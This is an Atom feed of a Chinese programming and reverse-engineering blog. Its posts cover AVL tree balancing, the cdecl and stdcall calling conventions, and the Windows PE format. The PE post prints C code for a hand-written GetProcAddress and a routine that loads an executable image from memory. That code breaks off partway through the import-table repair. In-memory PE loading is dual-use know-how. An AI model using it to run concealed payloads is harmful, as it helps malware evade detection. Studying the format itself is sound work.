<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>emmm&#39;s blog</title>
  
  
  <link href="https://h4ckf0rfun.github.io/atom.xml" rel="self"/>
  
  <link href="https://h4ckf0rfun.github.io/"/>
  <updated>2023-02-15T12:12:20.579Z</updated>
  <id>https://h4ckf0rfun.github.io/</id>
  
  <author>
    <name>emmm</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AVLTree</title>
    <link href="https://h4ckf0rfun.github.io/2023/02/15/AVLTree/"/>
    <id>https://h4ckf0rfun.github.io/2023/02/15/AVLTree/</id>
    <published>2023-02-15T12:11:03.000Z</published>
    <updated>2023-02-15T12:12:20.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AVL-Tree"><a href="#AVL-Tree" class="headerlink" title="AVL Tree"></a>AVL Tree</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念:"></a>概念:</h2><p>满足 “以任意节点为根的一颗子树左右高度差≤1” 这个条件的二叉树叫做平衡二叉树</p><h2 id="AVL-插入操作"><a href="#AVL-插入操作" class="headerlink" title="AVL 插入操作:"></a>AVL 插入操作:</h2><h3 id="在讲述插入操作之前，需要知道这几件事"><a href="#在讲述插入操作之前，需要知道这几件事" class="headerlink" title="在讲述插入操作之前，需要知道这几件事:"></a>在讲述插入操作之前，需要知道这几件事:</h3><ol><li>因为在每次插入节点之后都会调整整颗树为平衡树,所以在插入节点之前一定是一棵平衡树</li><li>平衡破坏时，只需要调整最小失衡子树即可</li><li>最小失衡子树在插入节点之前高度差一定为1，因为新插入的节点才导致高度差变为&gt;1</li><li>在插入的过程中遇到的最后一个高度差为1的节点,以这个节点为根的子树的平衡状态可能会被破坏.</li><li>从被破坏的位置向插入位置的路径中,所有子树高度差都为1,而且是由于插入新节点导致的,在插入之前这条路径上的所有子树高度差一定为0.(因为3)</li><li>倒着看,从插入节点向上查找最小失衡子树的过程中,若遇到一个左右子树高度差为0的节点,那么整棵树仍是平衡状态(高度没变)</li></ol><h2 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作:"></a>插入操作:</h2><p>记录到最后一个左右子树高度差不为0的节点A，因为只有这棵子树才可能成为最小失衡子树。</p><p>判断左插还是右插.</p><ol><li>插入后仍然平衡，最后一个左右子树高度差不为0 的子树此时高度差变为0</li><li><p>插入后不平衡，从插入位置往上到最后A路径上所有子树高度差此时变为1，(之前是0)</p><ol><li>往A左孩子的左子树插。左孩子的左右子树高度差之前是0，现在变成了1 (右旋操作)</li><li>往A左孩子的右子树插。左孩子的左右子树高度差之前是0，现在变成了1.(先左旋，后右旋)</li><li>往A右孩子的左子树插…..</li><li><p>往A右孩子的右子树插…..</p><p>(只有这四种情况.)</p></li></ol></li></ol><h3 id="a-LL情况"><a href="#a-LL情况" class="headerlink" title="a. LL情况"></a>a. LL情况</h3><p>由于A是最后一个高度差为1的节点，然后在A左孩子的左子树上插入，它只能是这种情况(未插入):</p><p><img src="https://h4ckf0rfun.github.io/2023/02/15/AVLTree/Untitled.png" alt="Untitled"></p><p>B的左右子树高度一定相同. (因为A是最后一个高度差为一的节点) ,在插入之后导致了这颗子树不平衡:</p><p><img src="https://h4ckf0rfun.github.io/2023/02/15/AVLTree/Untitled%201.png" alt="Untitled"></p><p>(其中两个红色任意一个都可以是新插入的节点)</p><p>一次右旋即可调整为平衡树：</p><p><img src="https://h4ckf0rfun.github.io/2023/02/15/AVLTree/Untitled%202.png" alt="Untitled"></p><p>注意观察，在插入之前这个子树的高度是H + 2，此时整颗树是平衡二叉树。</p><p>在插入并重新调整之后，这颗子树的高度仍然是H + 2，所以并不会影响整颗树的平衡状态，此时整棵树仍然是平衡二叉树。</p><h3 id="b-LR情况"><a href="#b-LR情况" class="headerlink" title="b.LR情况"></a>b.LR情况</h3><p>这个就是a情况中往b的右子树上插入，只不过这里我们还需要考虑一下B的右孩子的情况(插入之前):</p><p><img src="https://h4ckf0rfun.github.io/2023/02/15/AVLTree/Untitled%203.png" alt="Untitled"></p><p>还是同样的原因，由于A是最后一个左右子树高度差为1的节点，所以B的左右子树高度相同，C的左右子树高度相同。在插入一个新的节点之后变成了这样:</p><p><img src="https://h4ckf0rfun.github.io/2023/02/15/AVLTree/Untitled%204.png" alt="Untitled"></p><p>(图中新插入的节点为两个红色节点中的任意一个)。此时需要先左旋，转换为1 中的情况:</p><p><img src="https://h4ckf0rfun.github.io/2023/02/15/AVLTree/Untitled%205.png" alt="Untitled"></p><p>接着右旋：</p><p><img src="https://h4ckf0rfun.github.io/2023/02/15/AVLTree/Untitled%206.png" alt="Untitled"></p><p>此时这颗子树就被调整为了平衡二叉树，且它的高度是H+2，与插入之前这颗子树的高度一样。所以在插入之前整棵树是平衡状态，在插入并且调整之后整棵树仍然是平衡状态。</p><h3 id="RL与RR情况与上面两种情况类似，这里就不详细说明了。"><a href="#RL与RR情况与上面两种情况类似，这里就不详细说明了。" class="headerlink" title="RL与RR情况与上面两种情况类似，这里就不详细说明了。"></a>RL与RR情况与上面两种情况类似，这里就不详细说明了。</h3><h3 id="为什么只需要调整最小失衡子树就行？"><a href="#为什么只需要调整最小失衡子树就行？" class="headerlink" title="为什么只需要调整最小失衡子树就行？"></a>为什么只需要调整最小失衡子树就行？</h3><p>在a,与b两种情况中应该容易看出，我们调整的都是最小的那颗失去平衡的树。在插入之前与调整之后这颗子树的高度不变，不会影响整颗树的平衡状态。</p><h2 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作:"></a>删除操作:</h2><p>如果要删除的节点不是叶子节点，我们找一个叶子节点与要删除的节点交换位置。</p><p>现在我们只需要考虑删除叶子节点即可。</p><p>删除叶子节点可能会导致某一棵子树平衡状态破坏，注意如果某棵子树的平衡状态破坏，那么调整之后，这颗子树的高度会减1，那么之后还可能会破坏其他子树的平衡状态。所以需要调整以 ”从叶子到根路径上所有节点为根“ 的子树的平衡状态。但是即使破坏了平衡状态，高度差最大不会超过2。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AVL-Tree&quot;&gt;&lt;a href=&quot;#AVL-Tree&quot; class=&quot;headerlink&quot; title=&quot;AVL Tree&quot;&gt;&lt;/a&gt;AVL Tree&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="数据结构" scheme="https://h4ckf0rfun.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>cdecl调用约定和动态参数个数的实现</title>
    <link href="https://h4ckf0rfun.github.io/2023/02/10/cdecl%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%82%E6%95%B0%E4%B8%AA%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>https://h4ckf0rfun.github.io/2023/02/10/cdecl%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%82%E6%95%B0%E4%B8%AA%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0/</id>
    <published>2023-02-10T07:50:55.000Z</published>
    <updated>2023-02-10T07:52:27.787Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cdecl调用约定和动态参数个数的实现"><a href="#cdecl调用约定和动态参数个数的实现" class="headerlink" title="cdecl调用约定和动态参数个数的实现"></a>cdecl调用约定和动态参数个数的实现</h1><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h2><p>cdecl调用约定是由调用者清理堆栈 (这里以及下面说的清理都是指清理 用于参数传递的内存空间)，参数从右到左依次入栈:</p><p>看个例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line"><span class="built_in">int</span> s = <span class="built_in">sum</span>(<span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">printf(<span class="string">&quot;sum is :%d\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下对应的汇编:</p><p><img src="https://h4ckf0rfun.github.io/2023/02/10/cdecl%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%82%E6%95%B0%E4%B8%AA%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0/Untitled.png" alt="Untitled"></p><p>从图中可以看出，参数确实是从右往左压栈的，那么从哪里可以看出是由调用者清理堆栈呢?</p><p>注意看当call sum返回之后的下一条指令:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add esp,<span class="number">0x18</span></span><br></pre></td></tr></table></figure><p>由于在之前参数压栈时导致esp变化，调用结束后，调用者(main) 清理参数占用的栈空间(add esp)，使esp 恢复原来的位置</p><h2 id="与stdcall的不同之处"><a href="#与stdcall的不同之处" class="headerlink" title="与stdcall的不同之处"></a>与stdcall的不同之处</h2><p>与stdcall (由被调用者清理堆栈，参数从右到左依次压栈) 对比一下: </p><p><img src="https://h4ckf0rfun.github.io/2023/02/10/cdecl%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%82%E6%95%B0%E4%B8%AA%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0/Untitled%201.png" alt="Untitled"></p><p>可以看到，stdcall 在函数调用结束后是没有add esp,0x18 这条指令的。stdcall是由被调用者清理堆栈，那么我们看一下sum (被调用者)的汇编指令，和cdecl的有什么区别:</p><p>注意看ret 变成了ret 0x18 (ret 0x18 的作用是 改变eip并且将esp + 0x18)</p><p><img src="https://h4ckf0rfun.github.io/2023/02/10/cdecl%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%82%E6%95%B0%E4%B8%AA%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0/Untitled%202.png" alt="Untitled"></p><h2 id="动态参数个数的实现"><a href="#动态参数个数的实现" class="headerlink" title="动态参数个数的实现:"></a>动态参数个数的实现:</h2><p>stdcall 最后的ret xxx 里面包含了esp调整的大小，由于这条指令是在编译后就确定了，xxx的大小是无法改变的。但是运行阶段 每次调用sum时可能传递的参数个数不是固定的，这样必然是不行的。所以stdcall是无法实现这种功能的</p><p>cdecl 由于堆栈的清理是由调用者负责，而参数的传递也是由调用者负责的，调用者知道自已传了几个参数，所以他也知道在调用结束后应该清理多大的空间。这种调用约定是可以的。(printf 就是cdecl)</p><h2 id="到底传了几个参数"><a href="#到底传了几个参数" class="headerlink" title="到底传了几个参数?"></a>到底传了几个参数?</h2><p>参数压栈是由调用者负责的，那么被调用者是如何知道调用者真正传递了几个参数呢？答案是无法确定。</p><p>看一下我们的用例代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> count, ...)</span>&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">xor eax, eax;</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov ebx, [ebp + <span class="number">0x8</span>];</span><br><span class="line">loop_:</span><br><span class="line">cmp ecx, ebx;</span><br><span class="line">jge end_sum_;</span><br><span class="line">mov edx, [ebp + <span class="number">0x8</span> + ecx * <span class="number">4</span>];</span><br><span class="line">add eax, edx;</span><br><span class="line">inc ecx;</span><br><span class="line">jmp loop_;</span><br><span class="line">end_sum_:</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> s = sum(<span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sum is :%d\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下sum的声明:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> count, ...)</span></span><br></pre></td></tr></table></figure><p>当我们调用sum的时候，先给一个count，然后再把要加的数传给sum </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> s = sum(<span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);   <span class="comment">//(第一个5 表示后面有5个参数)</span></span><br></pre></td></tr></table></figure><p>然后我们在sum 内根据count 就可以求出那些数字之和 </p><p>(熟悉栈结构的话可以很容易取到count 的值和后面几个数 ，进入sum之后大概是这个样子的:</p><p><img src="https://h4ckf0rfun.github.io/2023/02/10/cdecl%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%82%E6%95%B0%E4%B8%AA%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0/Untitled%203.png" alt="Untitled"></p><p>)</p><p>如果我们将第一个5换成其他的数字，比如说3 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> s = sum(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);   <span class="comment">//(第一个5 表示后面有5个参数)</span></span><br></pre></td></tr></table></figure><p>那么这时候 求出来的 就是1 + 2 + 3，sum并不知道实际传了几个参数，它只会根据这个3来计算</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;cdecl调用约定和动态参数个数的实现&quot;&gt;&lt;a href=&quot;#cdecl调用约定和动态参数个数的实现&quot; class=&quot;headerlink&quot; title=&quot;cdecl调用约定和动态参数个数的实现&quot;&gt;&lt;/a&gt;cdecl调用约定和动态参数个数的实现&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="逆向" scheme="https://h4ckf0rfun.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>WindowsPE格式</title>
    <link href="https://h4ckf0rfun.github.io/2023/02/10/WindowsPE%E6%A0%BC%E5%BC%8F/"/>
    <id>https://h4ckf0rfun.github.io/2023/02/10/WindowsPE%E6%A0%BC%E5%BC%8F/</id>
    <published>2023-02-10T07:50:01.000Z</published>
    <updated>2023-02-10T07:50:33.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-PE格式"><a href="#Windows-PE格式" class="headerlink" title="Windows PE格式"></a>Windows PE格式</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line">LPVOID <span class="title function_">MyGetProcAddress</span><span class="params">(HMODULE hModule, <span class="type">const</span> <span class="type">char</span>*ProcName)</span>&#123;</span><br><span class="line">IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER*)(hModule);</span><br><span class="line">IMAGE_NT_HEADERS *pNtHeaders = (IMAGE_NT_HEADERS*)(pDosHeader-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line"></span><br><span class="line">IMAGE_EXPORT_DIRECTORY*pExportDirectory = (IMAGE_EXPORT_DIRECTORY*)(pNtHeaders-&gt;</span><br><span class="line">OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress + (DWORD)hModule);</span><br><span class="line"></span><br><span class="line">DWORD dwRavOfExportBegin = pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">DWORD dwRvaOfExportEnd = dwRavOfExportBegin + pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].Size;</span><br><span class="line"></span><br><span class="line">DWORD* FuncTable = (DWORD*)((DWORD)hModule + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">DWORD dwRvaOfFunc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//there is no export table;</span></span><br><span class="line"><span class="keyword">if</span> (dwRvaOfExportEnd == dwRavOfExportBegin)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == (<span class="number">0xffff0000</span> &amp; (DWORD)ProcName))&#123;</span><br><span class="line"><span class="comment">//by ordinary</span></span><br><span class="line">WORD ord = (WORD)ProcName;</span><br><span class="line">DWORD dwIndex = ord - pExportDirectory-&gt;Base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwIndex &gt;= pExportDirectory-&gt;NumberOfFunctions)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">dwRvaOfFunc = FuncTable[dwIndex];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//by name</span></span><br><span class="line">DWORD * NameTable = (DWORD*)((DWORD)hModule + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">WORD *OrdTable = (WORD*)((DWORD)hModule + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames; i++)&#123;</span><br><span class="line"><span class="type">char</span>*name = (<span class="type">char</span>*)(NameTable[i] + (DWORD)hModule);</span><br><span class="line"><span class="keyword">if</span> (!lstrcmpiA(name, ProcName))&#123;</span><br><span class="line">dwRvaOfFunc = FuncTable[OrdTable[i]];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//导出表重定向</span></span><br><span class="line"><span class="keyword">if</span> (dwRvaOfFunc&gt;dwRavOfExportBegin &amp;&amp; dwRvaOfFunc &lt; dwRvaOfExportEnd)&#123;</span><br><span class="line"><span class="type">char</span> szBuffer[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">char</span>*pModule = szBuffer;</span><br><span class="line"><span class="type">char</span>*pProc = pModule;</span><br><span class="line">lstrcpynA(szBuffer, (<span class="type">char</span>*)(dwRvaOfFunc + (DWORD)hModule), <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pProc[<span class="number">0</span>] &amp;&amp; pProc[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">pProc++;</span><br><span class="line">&#125;</span><br><span class="line">*pProc++ = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ((hModule = GetModuleHandleA(pModule)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">hModule = LoadLibraryA(pModule);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> MyGetProcAddress(hModule, pProc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">void</span>*)(dwRvaOfFunc + (DWORD)hModule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">LoadFromMem</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*image, LPVOID *lppImageBase, LPVOID *lppEntry)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//绝对地址需要重定位,所以DosHeader 和 FileHeader 里面的都是相对地址</span></span><br><span class="line">IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER*)image;</span><br><span class="line">IMAGE_NT_HEADERS *pNtHeaders;</span><br><span class="line">IMAGE_SECTION_HEADER*pSectionHeader;</span><br><span class="line">IMAGE_BASE_RELOCATION*pBaseRelocation;</span><br><span class="line">IMAGE_IMPORT_DESCRIPTOR*pImportDescriptor;</span><br><span class="line"></span><br><span class="line">DWORD dwDelta;</span><br><span class="line">DWORD dwImageSize;</span><br><span class="line">CHAR* ImageBase;</span><br><span class="line">DWORD dwOriginalBase;</span><br><span class="line">DWORD dwOff;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pDosHeader-&gt;e_magic != <span class="number">0x5a4d</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">dwOff = pDosHeader-&gt;e_lfanew;</span><br><span class="line">pNtHeaders = (IMAGE_NT_HEADERS*)(image + dwOff);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNtHeaders-&gt;Signature != <span class="number">0x4550</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dwImageSize = pNtHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">dwOriginalBase = pNtHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">ImageBase = (<span class="type">char</span>*)VirtualAlloc((LPVOID)dwOriginalBase, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)&#123;</span><br><span class="line">ImageBase = (<span class="type">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//copy Headers (Dos Stub + PE Header + Section Headers)</span></span><br><span class="line">RtlCopyMemory(ImageBase, image, dwOff + pNtHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"><span class="comment">//reset pNtHeaders</span></span><br><span class="line">pNtHeaders = (IMAGE_NT_HEADERS*)(ImageBase + dwOff);</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.ImageBase = (DWORD)ImageBase;</span><br><span class="line"></span><br><span class="line">pSectionHeader = (IMAGE_SECTION_HEADER*)(ImageBase + dwOff + <span class="keyword">sizeof</span>(DWORD)</span><br><span class="line">+ <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER) + pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//展开section,空间已经分配好了,只需要把相应位置的数据copy即可</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (pSectionHeader[i].SizeOfRawData &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//SizeOfRawData == 0, bss</span></span><br><span class="line">RtlCopyMemory(ImageBase + pSectionHeader[i].VirtualAddress,</span><br><span class="line">image + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修复IAT</span></span><br><span class="line"><span class="comment">//IMAGE_IMPORT_DESCRIPTOR 保存了dll name和从该dll导入哪些函数</span></span><br><span class="line">pImportDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)(ImageBase +</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>].VirtualAddress);</span><br><span class="line"></span><br><span 